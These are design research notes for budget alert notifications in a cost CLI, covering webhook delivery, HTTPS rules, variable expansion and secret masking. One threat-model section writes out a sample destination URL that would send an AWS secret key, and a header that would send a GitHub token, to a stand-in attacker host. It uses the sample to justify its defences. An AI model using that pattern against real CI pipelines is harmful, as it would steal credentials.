# Research: Budget Alert Notifications

All Technical Context unknowns are resolved below. Each entry records the
decision, the rationale, and the alternatives that were rejected.

## R1. Where notifications hook into the cost commands

- **Decision**: Send from `evaluateBudgetStatusWithRender`
  (`internal/cli/common_execution.go`), after the budget result is computed
  and before `checkBudgetExitFromResult`. `cost projected`, `cost actual`, and
  `overview` all reach budget evaluation through this one function.
- **Rationale**: One call site covers every budget-evaluating command, the
  rendered and unrendered paths, and both budget shapes (`LegacyStatus` and
  `ScopedResult` on `BudgetRenderResult`). The mixed-currency early return
  already skips evaluation, so it also skips notifications (spec edge case).
  Running before the exit check means a budget exit error cannot skip
  notifications, and the notification result is never combined with the
  returned error, so the exit code is unchanged (FR-011).
- **Alternatives considered**: Hooking inside `engine` budget evaluation was
  rejected because the engine has no command context, no `--dry-run` or
  `--notify` state, and no stderr. Hooking per command would need three call
  sites that could drift.

## R2. How an exceeded threshold finds its destinations

- **Decision**: Add `Notifications []NotificationDestination` to
  `config.AlertConfig`. `engine.ThresholdStatus` gains a copy of that slice
  with `json:"-"`, filled in `evaluateAlerts`, so the CLI layer can see which
  destinations belong to each exceeded alert.
- **Rationale**: Destinations are configured per alert (issue #220 config
  shape), and evaluation already turns each `AlertConfig` into one
  `ThresholdStatus`. `ScopedBudgetStatus.Alerts` is serialized into JSON
  output, so the field must be excluded from JSON or every destination URL
  would print in `--output json`.
- **Alternatives considered**: Matching `ThresholdStatus` back to
  `AlertConfig` by threshold and type was rejected because two alerts may
  share both values. Named, shared destinations referenced by key were
  rejected for this release; they can be added later without breaking the
  per-alert form.

## R3. Opt-in (FR-003)

- **Decision**: A boolean `--notify` persistent flag on `cost` (next to
  `--exit-on-threshold`) and a local `--notify` on `overview`. When the flag
  is not set, `FINFOCUS_NOTIFY` is parsed with `strconv.ParseBool`; an invalid
  value warns once and counts as false. An explicit flag wins over the
  variable.
- **Rationale**: Matches the existing pattern for environment variables that
  fill unset flags (`FINFOCUS_PLAIN`, `NO_COLOR`). CI sets the variable once;
  developers' local runs stay quiet.
- **Alternatives considered**: `CI=true` auto-detection (rejected by the user
  in clarification) and a config-file `enabled` switch, rejected because it
  would also fire on local runs that share the config.

## R4. Repeat alerts (FR-004)

- **Decision**: No state. Every opted-in run that crosses a threshold sends.
- **Rationale**: User decision. It also keeps the constitution's stateless
  execution model with no new persistent store.

## R5. Slack delivery without an SDK

- **Decision**: POST JSON to the incoming-webhook URL with stdlib `net/http`.
  The body has a `text` fallback and Block Kit `blocks` (header plus a
  fields section), as in issue #220. If `channel` is set it is included in
  the body; documentation notes that app-created incoming webhooks are bound
  to one channel and may ignore it. Success is any 2xx response.
- **Rationale**: Incoming webhooks need no authentication beyond the secret
  URL, so an SDK adds a dependency for one POST.
- **Alternatives considered**: `slack-go/slack` was rejected as a dependency
  for one request.

## R6. Generic webhook delivery

- **Decision**: JSON event body from issue #220 (`event`, `timestamp`,
  `budget`, `threshold`, `current`, `metadata`). The body also carries
  `budget.scope` and `budget.scope_key`, because scoped budgets did not exist
  when the issue was written. The method is `POST` (default) or `PUT`.
  Configured headers are added, and `Content-Type: application/json` is
  added unless a configured header sets it. Success is any 2xx response.
- **Rationale**: Covers the issue's payload and makes scoped budgets
  distinguishable to receivers.

## R7. HTTPS enforcement and redirects (FR-008)

- **Decision**: A literal URL must be `https://` with a host, checked by
  `config validate` and the cost pre-run. A URL containing `${...}` is
  checked after expansion at send time; a non-HTTPS result skips that
  destination with a warning. The HTTP client does not follow redirects; a
  3xx response is a failure.
- **Rationale**: Validation cannot know an environment variable's value. Not
  following redirects avoids a redirect to plain HTTP leaking the payload or
  headers.
- **Alternatives considered**: Following only HTTPS redirects adds code for
  a case incoming webhooks do not need.

## R8. Environment variable expansion (FR-009)

- **Decision**: Expand only `${NAME}` references, where `NAME` matches
  `FINFOCUS_NOTIFY_[A-Za-z0-9_]+` (see R8a). Any other `${...}` is an
  error and is not expanded. A bare `$` and `$NAME` are left literal. An unset
  or empty variable is an error naming the variable, and that destination is
  skipped.
- **Rationale**: `os.ExpandEnv` also expands `$NAME` and would corrupt URLs
  or tokens that contain `$`. Failing on an unset variable avoids sending to
  a half-built URL.

## R8a. CI secret exfiltration through a committed project config (FR-009, FR-016)

- **Threat**: `$PROJECT/.finfocus/config.hujson` is committed, so a pull
  request can change it. In CI with `FINFOCUS_NOTIFY=true`, a destination
  such as `https://attacker.example/?k=${AWS_SECRET_ACCESS_KEY}` or a header
  `Authorization: ${GITHUB_TOKEN}` would send a CI secret to the attacker.
  Pointing a destination at the attacker's host with
  `${FINFOCUS_NOTIFY_SLACK_URL}` would leak the team's notification secret.
- **Decision**:
  1. Only variables whose names start with `FINFOCUS_NOTIFY_` are expanded,
     in any config. Validation rejects any other reference, and `Expand`
     refuses it at send time, so the value is never read.
  2. Destinations that come from the project config never expand
     variables. `ShallowMergeYAML` marks every destination in a merged
     `cost` section as project-sourced (unexported `source` field set by
     the loader, not by JSON). Validation of a project document rejects a
     reference with a hint to move the destination to the global config;
     the dispatcher skips a project-sourced destination that contains a
     reference.
- **Rationale**: The prefix rule removes access to unrelated CI secrets
  even if the origin tracking were bypassed. The origin rule stops a pull
  request from redirecting the team's real notification secrets. The CI
  workflow, which a pull request from a fork cannot change for runs that
  receive secrets, writes the global config.
- **Residual risk (documented)**: a project-config destination with only
  literal values can make CI send the budget event to a host chosen in a
  pull request. The event holds budget figures only. Documentation tells
  teams not to set `FINFOCUS_NOTIFY` on untrusted pull-request runs.
- **Alternatives considered**: Ignoring all project-config destinations
  was rejected because per-project literal webhooks are a valid use case.
  A config allowlist of variable names was rejected as more configuration
  for the same protection the prefix gives.

## R9. Secret masking (FR-010, SC-004)

- **Decision**: Two layers.
  1. At send time, every resolved URL and header value of the destination is
     a secret. Any error text is passed through a redactor that replaces each
     secret with `[REDACTED]` before it reaches a warning or log. `*url.Error`
     embeds the URL, so redaction runs on the final string. Response bodies
     are never echoed; only the status code is reported.
  2. For display, `config get` and `config list` mask `url` and header values
     under `notifications` as `[REDACTED]`; a value that is only a `${NAME}`
     reference is shown as written, because it holds no secret.
- **Rationale**: `Config.Save` serializes the config with `json.Marshal`, so
  masking cannot live in a `MarshalJSON` method or `config set` would write
  `[REDACTED]` into the user's file. Masking therefore happens only in the
  display path.
- **Alternatives considered**: A `Secret` string type with a masking
  `MarshalJSON` was rejected for the reason above.

## R10. Time limit and concurrency (FR-012, SC-003)

- **Decision**: Each destination gets its own `context.WithTimeout` of 10
  seconds derived from the command context. All destinations for a run are
  sent concurrently (`sync.WaitGroup`), and results are collected in
  configuration order for stable warnings.
- **Rationale**: A slow destination cannot add more than 10 seconds in total
  (SC-003). Ten seconds matches the issue's expectation of a fast check.

## R11. Dry run (FR-013)

- **Decision**: When the run opted in and `ax.DryRunFromContext` is true, no
  request is made. Each delivery that would have happened prints one stderr
  line: `dry-run: would notify <type> for <scope> budget, <threshold>%
  <type> threshold` (no URL).
- **Rationale**: The global `--dry-run` already means "no side effects" for
  mutating commands; a network send is a side effect.

## R12. Testing approach

- **Decision**: Unit tests use `httptest.NewTLSServer` and inject its client
  into the notifier, so HTTPS is real. Redaction tests assert that no secret
  string appears in captured stderr or errors. CLI tests run a cost command
  over `examples/plans/aws-simple-plan.json` with a temp `FINFOCUS_HOME`
  config. Integration tests in `test/integration/` run the built binary
  against a local TLS mock. The binary trusts the mock's certificate through
  `SSL_CERT_FILE`, which Go's `crypto/x509` honors on Linux; those tests skip
  on other platforms. finfocus gets no flag that disables TLS verification.
- **Rationale**: The constitution allows mocking external systems only;
  Slack and webhook receivers are external.
